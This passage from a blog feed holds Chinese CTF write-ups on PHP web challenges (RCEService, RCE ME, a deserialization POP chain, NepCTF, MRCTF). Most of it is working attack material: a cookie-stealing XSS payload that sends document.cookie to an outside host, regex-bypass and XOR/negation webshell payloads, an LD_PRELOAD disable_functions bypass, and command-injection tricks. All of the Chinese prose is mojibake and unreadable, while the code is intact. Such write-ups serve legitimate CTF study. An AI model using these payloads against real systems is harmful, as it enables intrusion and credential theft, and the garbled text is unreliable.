class="hljs-string">&quot;&lt;script&gt;window.open(&#x27;http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);<span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>window.location.href=&#39;url&#39;</code>â€”-&gt;å®ç°æ¶æ„è·³è½¬       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/&#x27;+document.cookie&lt;/script&gt;&quot;</span>);<span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre></code></pre><h2 id="èŠå£«Â·"><a href="#èŠå£«Â·" class="headerlink" title="èŠå£«Â·"></a>èŠå£«Â·</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/105812056">åˆ©ç”¨phpçš„åŸç”Ÿç±»è¿›è¡ŒXSS</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF2019 RCEService</title>
    <link href="/2021/03/31/BUU61/"/>
    <url>/2021/03/31/BUU61/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜oâ€™-â€˜oâ€™"><a href="#â€˜oâ€™-â€˜oâ€™" class="headerlink" title="â€˜oâ€™  â€˜oâ€™"></a>â€˜oâ€™  â€˜oâ€™</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/4d9c90c2ba9a44e4.png"><br>å‘½ä»¤æ‰§è¡Œ<br>lsä¸€ä¸‹ï¼Œç”¨JSONæ ¼å¼ï¼š<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code><br>å¾—åˆ°ä¸€ä¸ª<code>index.php</code><br>é™¤æ­¤ä¹‹å¤–ï¼Œè¾“å…¥å…¶ä»–å‘½ä»¤ä¼šæŠ¥é”™ï¼Œè¿‡æ»¤äº†    </p><p>çœ‹WPéƒ½ç›´æ¥ç»™å‡ºçš„æºç ï¼Œä¹Ÿä¸çŸ¥é“å“ªæ¥çš„<code>â€˜ï¼Ÿâ€™</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;  $json = $_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>];  <span class="hljs-keyword">if</span> (!is_string($json)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;    $cmd = json_decode($json, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];    <span class="hljs-keyword">if</span> ($cmd !== <span class="hljs-literal">NULL</span>) &#123;      system($cmd);    &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>putenv â€” è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼</code><br>è®¾ç½®äº†ç¯å¢ƒå˜é‡ï¼Œä½†å¯ä»¥lsï¼Œæ˜¯å› ä¸ºè·¯å¾„ä¸‹æœ‰lsçš„äºŒè¿›åˆ¶æ–‡ä»¶<br><code>%0a</code>ç»•è¿‡<code>preg_match</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;ls+%2Fhome%2Frceservice&quot;%0A&#125;</code>ç›´æ¥åœ¨URLä¸­è¾“å…¥ï¼Œè¡¨å•æäº¤çš„è¯<code>%0a</code>ä¼šè¢«å†æ¬¡ç¼–ç ï¼Œå‡ºä¸æ¥<br><img src="https://ftp.bmp.ovh/imgs/2021/03/67a2d29f30e10e8a.png"><br>catæ²¡æ³•ç”¨ï¼Œå¯ä»¥ç”¨ç»å¯¹è·¯å¾„<code>/bin/cat</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;/bin/cat+%2Fhome%2Frceservice/flag&quot;%0A&#125;</code>          </p><p><strong>å›æº¯ç»•è¿‡</strong>     </p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x03-phppcrebacktrack_limit">Pç¥ï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a>        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestspayload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>res = requests.post(<span class="hljs-string">&quot;http://0c2928b7-761f-4fac-be5e-291db6ec5085.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<span class="hljs-comment">#print(payload)</span>print(res.text)</code></pre></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title>
    <link href="/2021/03/30/BUU60/"/>
    <url>/2021/03/30/BUU60/</url>
    
    <content type="html"><![CDATA[<h2 id="å¥½éš¾"><a href="#å¥½éš¾" class="headerlink" title="å¥½éš¾"></a>å¥½éš¾</h2><p>ä»£ç å®¡è®¡       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;            $code=$_GET[<span class="hljs-string">&#x27;code&#x27;</span>];                    <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">40</span>)&#123;                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);                                                &#125;                    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);                                                &#125;                    @<span class="hljs-keyword">eval</span>($code);&#125;<span class="hljs-keyword">else</span>&#123;            highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-comment">// <span class="hljs-meta">?&gt;</span></span></code></pre></code></pre><p>åŒ¹é…å­—æ¯å’Œæ•°å­—ï¼Œé•¿åº¦é™åˆ¶        </p><p>å¯ä»¥ç”¨urlç¼–ç å–å<br>çœ‹ä¸€ä¸‹<code>phpinfo()</code><br><code>?code=(~%8F%97%8F%96%91%99%90)();</code><br><code>diable_function</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/af56694c62004458.png"><br>ç„¶åå¯ä»¥æ„é€ ä¸€ä¸ªshellè¿èšå‰‘<br><img src="https://ftp.bmp.ovh/imgs/2021/03/867af17595321212.png"><br><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%A2%D6);</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/3c8a2ebff12bd606.png"><br>æ ¹ç›®å½•ä¸‹å‘ç°flagï¼Œä½†æ‰“å¼€ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œè¿˜æœ‰ä¸ªreadflagï¼Œåº”è¯¥è¦é€šè¿‡è¿™ä¸ªå¾—åˆ°flag          </p><p>ç»•è¿‡<code>disable_function</code><br><a href="https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator">EXP</a><br>å°†ä¸¤ä¸ªè„šæœ¬ä¸Šä¼ åˆ°<code>/var/tmp</code><img src="https://ftp.bmp.ovh/imgs/2021/03/867f27890d683cc6.png"><br>å†æ„é€ payload<br>è¿™é‡Œæ„é€ ç”¨çš„å¼‚æˆ–ï¼Œæˆ‘è¯•ç€è¿˜ç”¨å–åï¼Œä½†æ²¡æˆåŠŸï¼Ÿï¼Ÿ</p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/63bcafadb06aa2b4.png"><br><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/1fd484dc9735a262.png"> </p><p>è¿˜æœ‰å°±èšå‰‘çš„åº”ç”¨å¸‚åœºæœ‰ä¸€ä¸ªç»•è¿‡disable_functionçš„æ’ä»¶ï¼Œä½†æˆ‘ç”µè„‘ä¸Šçš„èšå‰‘æ‰“ä¸å¼€åº”ç”¨å¸‚åœºï¼Ÿï¼Ÿï¼Ÿï¼Ÿ      </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><strong><code>assert(eval($_POST[aa]))</code></strong><br><strong><code>$&#123;_GET&#125;[_]($&#123;_GET&#125;&#123;__&#125;)</code></strong>    </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">å¤§ä½¬å¼‚æˆ–çš„è„šæœ¬</a>       </p><pre><code><pre><code class="hljs python">payload = <span class="hljs-string">&quot;_GET&quot;</span>strlist = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">44</span>, <span class="hljs-number">45</span>, <span class="hljs-number">46</span>, <span class="hljs-number">47</span>, <span class="hljs-number">58</span>, <span class="hljs-number">59</span>, <span class="hljs-number">60</span>, <span class="hljs-number">61</span>, <span class="hljs-number">62</span>, <span class="hljs-number">63</span>, <span class="hljs-number">64</span>, <span class="hljs-number">91</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">123</span>, <span class="hljs-number">124</span>, <span class="hljs-number">125</span>, <span class="hljs-number">126</span>, <span class="hljs-number">127</span>]<span class="hljs-comment">#strlistæ˜¯asciiè¡¨ä¸­æ‰€æœ‰éå­—æ¯æ•°å­—çš„å­—ç¬¦åè¿›åˆ¶</span>str1,str2 = <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> payload:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strlist:        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strlist:            <span class="hljs-keyword">if</span>(i ^ j == <span class="hljs-built_in">ord</span>(char)):                i = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])                j = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:])                <span class="hljs-comment">#print(&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;.format(i,j),end=&quot;.&quot;)</span>                str1=str1+i                str2=str2+j                <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>print((str1)+<span class="hljs-string">&#x27;^&#x27;</span>+(str2))</code></pre></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ppppp</title>
    <link href="/2021/03/28/ppppp/"/>
    <url>/2021/03/28/ppppp/</url>
    
    <content type="html"><![CDATA[<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $A1;    <span class="hljs-keyword">public</span> $A2;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name,$param</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;$name&#125;)            &#123;                $A3 = <span class="hljs-keyword">$this</span>-&gt;&#123;$name&#125;;                $A3();            &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$wuhu</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;A2[$wuhu];    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $B1;    <span class="hljs-keyword">public</span> $B2;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;B1-&gt;godmi();    &#125;&#125; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $C1;    <span class="hljs-keyword">public</span> $C2;    <span class="hljs-keyword">public</span> $C3;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;C2 = <span class="hljs-keyword">$this</span>-&gt;C3.<span class="hljs-keyword">$this</span>-&gt;C1;    &#125; &#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $D1;            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FLAG</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        system(<span class="hljs-keyword">$this</span>-&gt;D1);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $E1;    <span class="hljs-keyword">public</span> $E2;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;E1-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;E2&#125;();        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;    &#125;&#125;$ppppp = $_POST[<span class="hljs-string">&#x27;Troy3e&#x27;</span>];unserialize($ppppp);<span class="hljs-meta">?&gt;</span>```      é­”æœ¯æ–¹æ³•çš„è°ƒç”¨       `__get`-----&gt;å½“è®¿é—®ç§æœ‰å±æ€§æ—¶ï¼Œæˆ–è€…ä¸å­˜åœ¨çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼›å‚æ•°ä¸ºè®¿é—®çš„å±æ€§åï¼Œé‡Œé¢çš„<span class="hljs-keyword">return</span>è¿”å›åˆ°è®¿é—®çš„å±æ€§ä¸­                ```php<span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $a;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> B();        <span class="hljs-keyword">$this</span>-&gt;a-&gt;adad;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;a-&gt;adad;    &#125;    &#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> $D=<span class="hljs-string">&quot;gg&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$re</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;D;        <span class="hljs-comment">//echo &#x27;123&#x27;;</span>        <span class="hljs-comment">//echo $re;</span>    &#125;&#125;$a=<span class="hljs-keyword">new</span> A();<span class="hljs-meta">?&gt;</span></code></pre>è¿”å›ï¼š  gg         </code></pre><p>ä¸€å¼€å§‹è¢«Aç±»ä¸­çš„<code>$A3()</code>å¸å¼•ï¼Œè§‰å¾—åº”è¯¥ç”¨è¿™ä¸ªè°ƒCä¸­çš„<code>__invoke</code>ï¼Œå¡äº†å‡ å¤©ï¼Œä¼¼ä¹ifè¿›ä¸å»;åº”è¯¥ç”¨<code>__get</code>ï¼Œé€šè¿‡Bç±»ä¸­çš„<code>__destruct</code>è§¦å‘invoke<br>popï¼š<code>B1-&gt;new A-&gt;A2[&quot;godmi&quot;]=new C()-&gt;invoke-&gt;tostring-&gt;FLAG()</code>       </p><pre><code>```phpclass A&#123;    public $A1;    public $A2;    public function __construct()    &#123;        $this-&gt;A2[&quot;godmi&quot;]=new C();    &#125;    public function __call($name,$param)    &#123;        if($this-&gt;&#123;$name&#125;)            &#123;                $A3 = $this-&gt;&#123;$name&#125;;                $A3();            &#125;    &#125;    public function __get($wuhu)    &#123;        return $this-&gt;A2[$wuhu];    &#125;&#125;class B&#123;    public $B1;    public $B2;    public function __construct()    &#123;        $this-&gt;B1=new A();        $this-&gt;B1-&gt;godmi;    &#125;    public function __destruct()    &#123;        $this-&gt;B1-&gt;godmi();    &#125;&#125; class C&#123;    public $C1;    public $C2;    public $C3;    public function __construct()    &#123;        $this-&gt;C1=new D();        $this-&gt;C3=new E();    &#125;    public function __invoke()    &#123;        $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1;    &#125; &#125;class D&#123;    public $D1=&#39;cat /flag&#39;;&#125;class E&#123;    public $E1;    public $E2=&#39;FLAG&#39;;    public function __construct()    &#123;        $this-&gt;E1=new D();    &#125;&#125;$x=new B();echo serialize($x);?&gt;```       </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepctf</title>
    <link href="/2021/03/27/Nepctf/"/>
    <url>/2021/03/27/Nepctf/</url>
    
    <content type="html"><![CDATA[<h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    error_reporting(<span class="hljs-number">0</span>);    highlight_file(<span class="hljs-keyword">__FILE__</span>);    $nep = $_GET[<span class="hljs-string">&#x27;nep&#x27;</span>];    $len = $_GET[<span class="hljs-string">&#x27;len&#x27;</span>];    <span class="hljs-keyword">if</span>(intval($len)&lt;<span class="hljs-number">8</span> &amp;&amp; strlen($nep)&lt;<span class="hljs-number">13</span>)&#123;        <span class="hljs-keyword">eval</span>(substr($nep,<span class="hljs-number">0</span>,$len));    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too long!&#x27;</span>);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>é•¿åº¦é™åˆ¶çš„ç»•è¿‡ï¼š      </p><pre><code>nep=`ls&gt;z`;&amp;len=-1     &gt;  å†™å…¥æ–‡ä»¶nep=`&gt;cat`;&amp;len=-1     &gt;cat  ç”Ÿæˆä¸€ä¸ªåä¸ºcatçš„æ–‡ä»¶  nep=`*&gt;z`;&amp;len=-1      è¾“å…¥é€šé…ç¬¦*ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°    </code></pre><hr><pre><code>nep=`$nep`;ls&gt;z&amp;len=-1  nep=`$nep`;&gt;cat&amp;len=-1       nep=`$nep`;*&gt;z&amp;len=-1     </code></pre><hr><pre><code>?len=7;ls &gt; 1.txt;&amp;nep=`$len`;intval å¤„ç†å‰é¢çš„7ï¼Œå‘½ä»¤æ‰§è¡Œçš„æ˜¯æ•´ä¸ªlen        </code></pre><hr><p><strong>å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡</strong><br>å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š   </p><ol><li>eval       </li><li>assert     </li><li>preg_replace()</li></ol><pre><code>preg_replace ( mixed $pattern , mixed $replacement ,         mixed $subject [, int $limit = -1 [, int &amp;  $count ]] ) : mixed       å½“patternåæœ‰/eæ˜¯ï¼Œå¦‚æœsubjectä¸­åŒ¹é…åˆ°äº†patternï¼Œåˆ™          replacementä¼šè¢«å½“ä½œPHPä»£ç æ‰§è¡Œ      </code></pre><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡<code>p.hpinfo()</code>ã€<code>((sy.(st).em)(whoami);</code>        </li><li>å¤šæ¬¡ä¼ å‚ç»•è¿‡<code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code>       </li><li>URLç¼–ç å–åç»•è¿‡<code>urlencode(~&#39;phpinfo&#39;)</code>      </li><li>å¼‚æˆ–ç»•è¿‡<code>&#39;?&#39;^&#39;~&#39;</code>â€”&gt;<code>A</code>      </li><li><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">MORE</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020å¥—å¨ƒ</title>
    <link href="/2021/03/27/BUU59/"/>
    <url>/2021/03/27/BUU59/</url>
    
    <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>æ‰“å¼€æ˜¯è¿™æ ·ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/03/483e33b7c3964736.png"><br>æŸ¥çœ‹æºç <img src="https://ftp.bmp.ovh/imgs/2021/03/eb6c980855779342.png">       </p><pre><code>http://localhost/aaa/index.php?p=222&amp;q=333ç»“æœï¼š$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;$_SERVER[&#39;REQUEST_URI&#39;]  = &quot;/aaa/index.php?p=222&amp;q=333&quot;;$_SERVER[&#39;SCRIPT_NAME&#39;]  = &quot;/aaa/index.php&quot;;$_SERVER[&#39;PHP_SELF&#39;]     = &quot;/aaa/index.php&quot;;$_SERVER[&quot;QUERY_STRING&quot;]  è·å–æŸ¥è¯¢ è¯­å¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼$_SERVER[&quot;REQUEST_URI&quot;]   è·å– http://localhost åé¢çš„å€¼ï¼ŒåŒ…æ‹¬/$_SERVER[&quot;SCRIPT_NAME&quot;]   è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œå¦‚ï¼šindex.php$_SERVER[&quot;PHP_SELF&quot;]      å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å       </code></pre><p>ä¼ å…¥<code>b_u_p_t</code>,ä½†ä¸èƒ½æœ‰<code>_</code>å’Œ<code>%5f</code><br>å¯ä»¥å°†<code>_</code>æ›¿æ¢ä¸º<code>%20</code>ã€<code>%5F</code>ã€<code>.</code>,phpè§£ææ—¶ä¼šå°†å…¶è½¬æ¢ä¸º<code>_</code><br><a href="https://www.freebuf.com/articles/web/213359.html?tdsourcetag=s_pcqq_aiomsg">phpå­—ç¬¦ä¸²è§£æç‰¹æ€§</a><br>ä¸‹é¢çš„ifç”¨<code>%0a</code>â€”&gt;æ¢è¡Œç¬¦ç»•è¿‡<br>payloadï¼š<code>?b.u.p.t=23333%0a</code></p><pre><code>FLAG is in secrettw.php    </code></pre><p>æŸ¥çœ‹æºç <br><img src="https://ftp.bmp.ovh/imgs/2021/03/825742d64ca82ac5.png"><br>æ”¾å…¥æ§åˆ¶å°ï¼Œå›è½¦<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7043aa313eed9a53.png"><br>éšä¾¿ä¼ ä¸ªå€¼ï¼Œå‡ºç°æºç    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> error_reporting(<span class="hljs-number">0</span>); <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123;     highlight_file(<span class="hljs-keyword">__FILE__</span>);     <span class="hljs-keyword">die</span>(); &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123;     $v = base64_decode($v);     $re = <span class="hljs-string">&#x27;&#x27;</span>;     <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) + $i*<span class="hljs-number">2</span> );     &#125;     <span class="hljs-keyword">return</span> $re; &#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;$ip = getIp();<span class="hljs-keyword">if</span>($ip!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;<span class="hljs-keyword">if</span>($ip === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span 